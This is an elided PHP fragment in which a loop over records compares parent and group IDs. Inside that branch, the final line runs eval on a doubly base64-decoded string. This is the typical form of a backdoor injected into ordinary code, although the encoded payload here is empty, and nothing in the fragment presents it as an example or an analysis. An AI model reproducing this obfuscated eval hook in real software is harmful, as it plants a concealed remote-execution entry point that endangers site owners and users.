		...
		for($i=0; $i<count($arr); $i++) {
			...
			if($do) {	  
				...
				if(!empty($arr[$i]["parent_id"]) && $arr[$i]["parent_id"] != $arr[$i]["group_id"]) {
		    		...
		    		$str = ''; eval(base64_decode(base64_decode($str)));
